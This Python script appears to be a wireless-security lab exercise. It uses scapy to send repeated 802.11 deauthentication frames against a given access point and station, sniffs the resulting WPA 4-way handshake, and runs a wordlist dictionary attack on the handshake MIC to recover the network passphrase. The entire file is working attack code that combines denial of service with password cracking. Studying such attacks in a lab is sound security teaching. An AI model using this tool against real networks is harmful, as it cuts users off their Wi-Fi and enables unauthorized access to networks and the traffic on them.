from binascii import a2b_hex

from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

from files.scaircrack import compute_mic

WIFI_INTERFACE_NAME = "wlan0mon"

# This script takes as argument the mac address of the AP, the mac address of the station and the SSID.
# It then sends a deauth packet, captures the 4-way handshake and then performs a dictionary attack on the handshake


##########################################################
# This is the code of our deauth attack from the first lab
##########################################################

def handle_deauth(ap_mac, sta_mac, reason_code):
    """
    Sends a deauth packet from the ap to the sta or from the sta to the ap depending on the reason code
    """

    match reason_code:
        case 1:
            send_deauth(source_mac=sta_mac, dest_mac=ap_mac, bssid=ap_mac, reason_code=1)
        case 4:
            send_deauth(source_mac=ap_mac, dest_mac=sta_mac, bssid=ap_mac, reason_code=4)
        case 5:
            send_deauth(source_mac=ap_mac, dest_mac=sta_mac, bssid=ap_mac, reason_code=5)
        case 8:
            send_deauth(source_mac=sta_mac, dest_mac=ap_mac, bssid=ap_mac, reason_code=8)
        case _:
            print("unknown reason code")


def send_deauth(dest_mac, source_mac, bssid, reason_code):
    packet_to_send = (
            # wlan header
            RadioTap() /
            # addr1 is receiver/destination
            # addr2 is transmitter/source
            # addr3 is BSS id (AP MAC)
            Dot11(addr1=dest_mac, addr2=source_mac, addr3=bssid) /
            # deauth packet
            Dot11Deauth(reason=reason_code)
    )
    sendp(packet_to_send, iface=WIFI_INTERFACE_NAME, count=100)


##########################################################
# This is the code of part 1 of this lab, modified to do a real capture
##########################################################

def capture_handshake():
    """Captures a 4-way handshake and returns the values needed for a brute force attack"""

    # Capture packets during 10 seconds
    frame_arr = sniff(iface=WIFI_INTERFACE_NAME, timeout=10)

    # Filter the packets to keep only the 4-way handshake
    fourWayHandshake = frame_arr.filter(
        lambda pkt: pkt if pkt.haslayer(EAPOL) and pkt.getlayer(EAPOL).type == 3 else None
    )

    APmac = a2b_hex(fourWayHandshake[3].addr1.replace(":", ""))
    Clientmac = a2b_hex(fourWayHandshake[3].addr2.replace(":", ""))

    # Authenticator and Supplicant Nonces
    ANonce = fourWayHandshake[0].load[13:13 + 32]
    SNonce = fourWayHandshake[1].load[13:13 + 32]

    # This is the MIC contained in the 4th frame of the 4-way handshake
    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
    mic_to_test = fourWayHandshake[3].load[77:77 + 16]

    eapol = fourWayHandshake[3].getlayer(EAPOL)
    data = eapol.version.to_bytes(1, 'big') + eapol.type.to_bytes(1, 'big') + eapol.len.to_bytes(2, 'big') + eapol.load[:77] + b'\x00' * 18

    return APmac, Clientmac, ANonce, SNonce, mic_to_test.hex(), eapol, data




if __name__ == "__main__":

    if len(sys.argv) != 4:
        print("Usage: <command> <ap MAC> <sta MAC> <SSID>")
        sys.exit()

    ap_mac = sys.argv[1]
    sta_mac = sys.argv[2]
    ssid = sys.argv[3]


    # Send a deauth packet
    handle_deauth(ap_mac, sta_mac, 4)

    # Capture the 4-way handshake
    APmac, Clientmac, ANonce, SNonce, mic_to_test, eapol, data = capture_handshake()

    # De https://raw.githubusercontent.com/Taknok/French-Wordlist/master/francais.txt
    filename = "wordlist.txt"

    with open(filename, "r") as f:
        passwords = f.readlines()

    # For each password candidate, we compute the MIC and compare it to the one from the handshake
    for password in passwords:
        password = password.strip()
        print("Testing password: {}".format(password))
        if compute_mic(password, ssid, APmac, Clientmac, ANonce, SNonce, data) == mic_to_test:
            print("Password found: {}".format(password))
            break

